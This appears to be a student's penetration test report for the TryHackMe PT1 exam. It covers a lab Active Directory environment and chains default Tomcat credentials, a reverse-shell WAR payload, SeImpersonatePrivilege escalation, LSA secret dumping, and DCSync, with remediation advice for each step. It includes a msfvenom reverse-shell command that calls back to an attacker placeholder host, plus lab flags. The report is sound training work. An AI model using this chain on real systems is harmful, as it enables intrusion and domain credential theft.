# **TryHackMe PT1 — Penetration Testing Report**

**Assessment:** TryHackMe - PT1 entry-level certification exam

**Client:** TryBankMe

**Assessment date:** 18th, October 2026

**Assessor:** Alexandre Pineda

## **Executive Summary**

The assessment covered a Windows workstation under the TryBankMe’s Active Directory domain, and the Domain Controller that runs various services internally for Active Directory domain management purposes.

Initial web assessment concerning the Windows workstation revealed a web application with default login credentials left unchanged paired with an exposed endpoint for authentication. This authenticated access could allow an attacker to gain an initial access on the local system.

The local machine assessment revealed a dangerous `SeImpersonatePrivilege` local privilege that allows an attacker to to usurpate another user identify after getting authenticated. The vulnerability associated with this privilege is well known to attackers, given the broad scope of access it provides.

Therefore, locally stored secrets could be extracted, including a password associated with a `svc.callback` service account. These credentials could then be leveraged to gain access to the Active Directory domain and facilitate further lateral movement.

Excessive configured permissions were identified within the Active Directory permissions list of the service account. It grants sensitive access rights to the domain object over multiple privileged entities within the domain that could be leveraged to achieve ultimately a total domain compromise.

### Key Findings — Workstation

| Findings (WRK) | Assessment area | Finding | Risk | Flag |
| --- | --- | --- | --- | --- |
| WRK-01 | Windows OS Workstation | Default Tomcat Manager Credentials Leading to Remote Code Execution via Malicious WAR Deployment | **Critical** — CVSS Score: <u>**9.8**</u> | THM{cd061eb8-3c36-4030-bbc9-cd5c68562fe1} |
| WRK-02 | Windows OS Workstation | Local Privilege Escalation to SYSTEM via `SeImpersonatePrivilege` | High — CVSS Score:  7.8 |     |

### Key Findings — Domain Controller

| **ID** | **Assessment area** | **Finding** | **Risk** | **Flag** |
| --- | --- | --- | --- | --- |
| DC-01 | Windows OS Domain Controller | Excessive Active Directory DACL Permissions Leading to <u>**Domain Compromise**</u> | **Critical** — CVSS <u>**9.9**</u> | THM{391e9661-df5f-4a38-b53d-2bcc8c51702d} |

---

---

# Detailed Assessment

 Domain Name: `tryhackme.loc`

**Targets:**

- Windows OS workstation joined to the TryBankMe’s Active Directory standard domain (`WRK`,`10.200.150.20`).
- Domain Controller (`DC`,`10.200.150.10`).

---

---

## **Finding N°1  —** Default Tomcat Manager Credentials Leading to Remote Code Execution via Malicious WAR Deployment **(**`WRK.tryhackme.loc` **workstation)**

- **Risk:** **`Critical`** — CVSS **9.8**

**Description:** A web server has been identified as running over HTTP; it revealed a hosted Tomcat web application that enables directory listing.

Vendor-default management credentials have been left unchanged and could be found on the `403.jsp` page after **exiting** the HTTP Basic Auth form (on the `/manager` endpoint) with an input such as *Escape*, which could allow an attacker to authenticate at the `/manager` endpoint, from which a malicious WAR file could be uploaded, leading to remote code execution.  Here's how the delivered payload could be set up:

`msfvenom -p java/meterpreter/reverse_tcp -f war LHOST=<ATTACKER_IP> LPORT=<PORT> -o malicious.war`

---

## **Impact:**

Attackers could leverage unchanged vendor-default credentials to access the Tomcat Manager and deploy a malicious WAR file, resulting in remote code execution (RCE). This initial access provided a foothold on the workstation, which enables, as part of this assessment, further enumeration and exploitation of the internal Active Directory environment, which could ultimately lead to full domain compromise.

### **Remediation:**

- Replace application default credentials
- Implement strict password policies, as opponents may use various fuzzing and brute-force techniques to crack them if they aren't unique or strong enough.
- Remove or disable the Manager if it is not needed
- Apply the principle of least privilege

---

## **Finding N°2 —**Local Privilege Escalation to SYSTEM via “SeImpersonatePrivilege” **(**`WRK.tryhackme.loc` **workstation)**

- **Risk:** High — CVSS 7.8

**Description:** The system assessment concerning the “WRK” workstation machine revealed a critical `SeImpersonatePrivilege` local privilege that allows an attacker to impersonate a user's security token. The vulnerability associated with this privilege is well known to attackers that offers them various methods to leverage the impersonation mechanism through named pipes.

The opponent will likely want to use one of the tools from the well-known “Potato” family, or by exploiting the Print Spoofer service, if enabled.

As part of the assessment, privilege escalation to `NT AUTHORITY\SYSTEM` local account follows. LSA secrets were extracted from the workstation (`SECURITY` local base) through the use of a Mimikatz module. The recovered credentials were subsequently used to obtain authenticated access within the Active Directory environment and perform further enumeration.

**Impact.** This privilege could be abused to escalate privileges vertically from the compromised workstation account to `NT AUTHORITY\SYSTEM` local account, granting to the attacker full control over the workstation. This could enable opponents to access sensitive files, credentials, and system resources, which may facilitate further compromise of the environment. Damage to resources is also a possibility that cannot be ruled out. The cleartext password of the service user could then been recovered from LSA local secrets because of the SYSTEM full access granted on the Windows workstation.

### **Remediation:**

- Apply the principle of least privilege by restricting **`SeImpersonatePrivilege`** to user and service accounts that strictly require it.
- Review local security policies and remove unnecessary privileges from user and service accounts.
- Keep Windows systems fully patched to mitigate known local privilege escalation vulnerabilities.

---

## **Finding N°3 —**Excessive Active Directory DACL Permissions Leading to Domain Compromise **(`DC.tryhackme.loc` Domain Controller)**

- **Risk:** **`Critical`** — **CVSS 9.9**

### **Description:**

Following the initial compromise of the WRK workstation, a reverse SOCKS proxy tunnel was established using Chisel to route traffic through the compromised host. The proxy was exposed locally on the attacker machine at `127.0.0.1:1080` and configured for use with ProxyChains.

This setup enabled access to internal Active Directory services on the domain controller (`10.200.150.10`), allowing further enumeration of the `tryhackme.loc` domain using BloodHound.

From this local access point, It was an opportunity to continue with lateral movements toward the Active Directory domain; inspecting users DACLs to spot any sensitively misconfigured permissions for privilege escalation within the domain revealed a critical **`GenericWrite`** ACE configured across most over the domain's highly privileged groups.

Indeed, this permission has been defined in the “svc.callback” user's DACL over several entities. The assessment identified excessive `GenericWrite` permissions granted to the `svc.callback` account over eighteen privileged domain objects, including the “krbtgt” *Kerberos Service* account *or the* Domain Admins privileged group. Permission granted offers enough privileges to write in the LDAP attributes concerning the targeted object.

### **Impact:**

Having gained initial access (as discussed in the previous findings), opponents could leverage `GenericWrite` sensitive granted permissions to write in the LDAP group properties in order to escalate privileges vertically within the domain, granting full controll over the domain. For instance, the principal could be able to add itself on the group to which this permission applies for the user. During the assessment, the  *Domain Admin* group appeared vulnerable to this misconfiguration, allowing the svc.callback user to escalate privileges as a Domain Administrator (Domain Admin group members) successfully. A malicious actor would to add themselves to this vulnerable group to the permission applied to the user by executing the following command via the Remote Procedure Call (RPC) protocol:

<REDACTED>

Member of this group  often have `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` access rights configured by default, allowing to perform a **DCSync** domain-level attack**.** This technique has been achieved as part of the assessment. It consists in usurpate DC’s replication role in order to query replicated data (through the “DRSUAPI” RPC interface) to the in-scope DC. Consequently, all **`NTDS.dit`** sensitive data replicated through DCSync could be retrieved, including NTLM password hashes for all domain users, resulting in complete domain compromise.

## **Remediation**

- **Review and remediate excessive Active Directory permissions:** Audit the DACLs of privileged domain objects, including the Domain Admins group, the `krbtgt` account, and other sensitive domain entities. Remove the `GenericWrite` ACE permission granted to `svc.callback` if unnecessary.
- **Enforce the principle of least privilege:** Restrict write access to sensitive LDAP attributes and security-related properties of privileged accounts and groups to explicitly authorized administrators. Review delegated permissions across the domain objects to prevent unauthorized privilege escalation.
- **Restrict general permissions:**  Ensure that domain objects have the appropriate permissions within their DACL, and avoid granting permissions that are unnecessarily permissive, such as setting exclusively *ForceChangePassword*, to cite another example. ****Regularly audit these permissions and investigate unauthorized changes or suspicious replication activity.
- **Audit privileged accounts and group memberships:** Review Domain Admins membership and monitor modifications to privileged groups, account attributes, and object DACLs. Investigate unexpected permission assignments and changes that could enable privilege escalation or persistence.
- **Respond to the confirmed domain compromise:** Investigate the extent of credential exposure, rotate affected credentials, and remove unauthorized persistence mechanisms. If the `krbtgt` key material was compromised, perform a controlled `krbtgt` password reset procedure in accordance with Microsoft's guidance.

---

---

## Conclusion

The assessment identified multiple security weaknesses affecting the in-scope Windows workstation and Active Directory environment, ranging from remote code execution through exposed Tomcat Manager credentials to local privilege escalation and excessive Active Directory permissions.

The exploitation chain demonstrated how an initial compromise of the WRK workstation could facilitate access to domain credentials and further privilege escalation within the `tryhackme.loc` domain. The successful DCSync operation confirmed a critical compromise of domain confidentiality, exposing sensitive authentication data.

Immediate remediation should prioritize removing default credentials, restricting unnecessary local privileges, reviewing and correcting excessive Active Directory permissions, and investigating the extent of credential exposure. All affected credentials should be rotated, and privileged account memberships, directory permissions, and replication activity should be reviewed for unauthorized changes.

Following remediation, the affected systems and Active Directory configuration should be reassessed to validate that the identified attack paths have been effectively eliminated.

---

---

# Appendices — Technical References and Supporting Evidence

## Appendix A — Tomcat (Manager) and Remote Code Execution (WRK-01)

**A.1 — Apache Tomcat: Manager App How-To**

Official documentation describing the Tomcat Manager application, including application deployment through WAR files and the associated administrative access requirements.

URL: https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html

**A.2 — Apache Tomcat: Security Considerations**

Official security guidance covering Tomcat configuration, unnecessary applications, and security measures relevant to administrative interfaces.

URL: https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html

**Relevance to WRK-01:** These references support the technical explanation of Tomcat Manager access and WAR deployment. The observed default credentials and successful remote code execution must be substantiated by evidence collected during the assessment.

---

## Appendix B — Windows Impersonation and Local Privilege Escalation (WRK-02)

**B.1 — Microsoft Learn: SeImpersonatePrivilege**

Official Microsoft documentation concerning the Windows privilege that allows a process to impersonate a client after authentication.

URL: https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege

**B.2 — PrintSpoofer: Technical Documentation**

Technical reference describing the PrintSpoofer technique and its abuse of Windows impersonation mechanisms under specific conditions.

URL: https://github.com/itm4n/PrintSpoofer

**B.3 — MITRE ATT&CK: Privilege Escalation**

Reference describing privilege escalation as an adversary tactic.

URL: https://attack.mitre.org/tactics/TA0004/

**Relevance to WRK-02:** These sources provide technical context for Windows impersonation and privilege escalation. The successful escalation to `NT AUTHORITY\SYSTEM` must be demonstrated by the assessment evidence.

## Appendix C — LSA Secrets and Credential Exposure (WRK-02)

**C.1 — MITRE ATT&CK: OS Credential Dumping — LSA Secrets**

Reference describing the extraction of Local Security Authority (LSA) secrets and the types of sensitive information they may contain.

URL: https://attack.mitre.org/techniques/T1003/004/

**C.2 — Microsoft Learn: Registry Hives**

Official documentation explaining Windows registry hives, including the organization of registry data.

URL: https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives

**Relevance to WRK-02:** These sources support the discussion of local LSA secret exposure. The observed recovery of the `svc.callback` credential must be supported by redacted command output or equivalent evidence. The use of Mimikatz `lsadump::secrets` should not be described as a dump of LSASS process memory.

## Appendix D — Active Directory Permissions, GenericWrite and DCSync (DC-01)

**D.1 — Microsoft Learn: ActiveDirectoryRights**

Official API documentation describing Active Directory access rights, including `GenericWrite`.

URL: https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights

**D.2 — Microsoft: Best Practices for Securing Active Directory**

Official security guidance addressing the protection of Active Directory and the management of privileged access.

URL: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory

**D.3 — Microsoft Learn: DS-Replication-Get-Changes-All**

Reference describing the extended right associated with replicating secret domain data.

URL: https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all

**D.4 — Microsoft Learn: Replicating Directory Changes Permission**

Official guidance concerning the Replicating Directory Changes permission in Active Directory.

URL: https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/grant-replicating-directory-changes-permission-adma-service

**D.5 — MITRE ATT&CK: OS Credential Dumping — DCSync**

Reference describing DCSync, which abuses directory replication mechanisms to obtain sensitive domain authentication data when the required permissions are available.

URL: https://attack.mitre.org/techniques/T1003/006/

**D.6 — Microsoft Learn: Audit Directory Service Changes**

Official guidance describing auditing of changes to Active Directory objects.

URL: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-directory-service-changes

**Relevance to DC-01:** These references support the explanation of Active Directory access rights, replication permissions, DCSync, and monitoring recommendations. The report must independently demonstrate the `GenericWrite` permissions observed on the eighteen privileged objects and the exact exploitation path leading to the required replication rights. `GenericWrite` does not automatically grant DCSync permissions.

DCSync can retrieve replicated directory data, including password hashes, without necessarily downloading the physical `NTDS.dit` file.

## Appendix E — Assessment Evidence

This appendix contains evidence collected directly during the authorized assessment. External documentation does not replace evidence of exploitation on the in-scope targets.

**E.1 — WRK-01: Tomcat Authentication**

Evidence showing the discovery of the default credentials and successful authentication to the Tomcat Manager.

**E.2 — WRK-01: Remote Code Execution**

Evidence demonstrating successful deployment of the WAR payload and execution of code on the workstation.

**E.3 — WRK-02: Privilege Enumeration and SYSTEM Access**

Evidence showing the relevant privileges of the compromised account and the resulting `NT AUTHORITY\SYSTEM` context.

**E.4 — WRK-02: LSA Secret Extraction**

Redacted output demonstrating the extraction of relevant LSA secrets and, where appropriate, the subsequent validation of the `svc.callback` credentials.

**E.5 — DC-01: Active Directory Permission Enumeration**

BloodHound screenshots or equivalent output documenting the relevant ACEs, affected objects, and permissions associated with `svc.callback`.

**E.6 — DC-01: Privilege Escalation Path**

Evidence demonstrating the specific modification or permission abuse that enabled the next stage of the attack chain.

**E.7 — DC-01: DCSync Execution**

Redacted evidence of the DCSync operation and the results obtained from the domain controller.

**E.8 — DC-01: Credential Exposure**

Redacted evidence demonstrating the recovery of relevant domain authentication data, such as NTLM hashes.

## Appendix F — CVSS Scoring Methodology

**F.1 — FIRST: Common Vulnerability Scoring System (CVSS) v3.1 Specification**

Official specification defining the CVSS v3.1 metrics and scoring methodology.

URL: https://www.first.org/cvss/v3.1/specification-document

**F.2 — FIRST: CVSS v3.1 Calculator**

Official calculator for validating CVSS v3.1 scores from their corresponding metric selections.

URL: https://www.first.org/cvss/calculator/3.1

**Relevance:** The CVSS score and complete vector for each finding must be checked against the conditions observed during the assessment. Scores listed in this report should be treated as provisional until their vectors have been validated.

## Appendix G — Network Pivoting with Chisel

**G.1 — Chisel: Official Project Repository**

Technical documentation for Chisel, including its tunneling functionality and SOCKS proxy support.

URL: https://github.com/jpillora/chisel

**Relevance to DC-01:** This reference supports the description of the tunneling mechanism used to reach internal Active Directory services through the compromised workstation. Evidence of the actual tunnel configuration and successful internal connectivity must be provided separately in the assessment evidence.

## Reference and Evidence Integrity

All external references are provided to support the technical explanations and remediation recommendations in this report. Evidence collected during the assessment is identified separately in Appendix E.

Only findings and exploitation steps directly supported by the assessment evidence should be presented as confirmed. Sensitive credentials, tokens, and complete password hashes should be redacted unless their full disclosure is strictly necessary for the authorized recipient
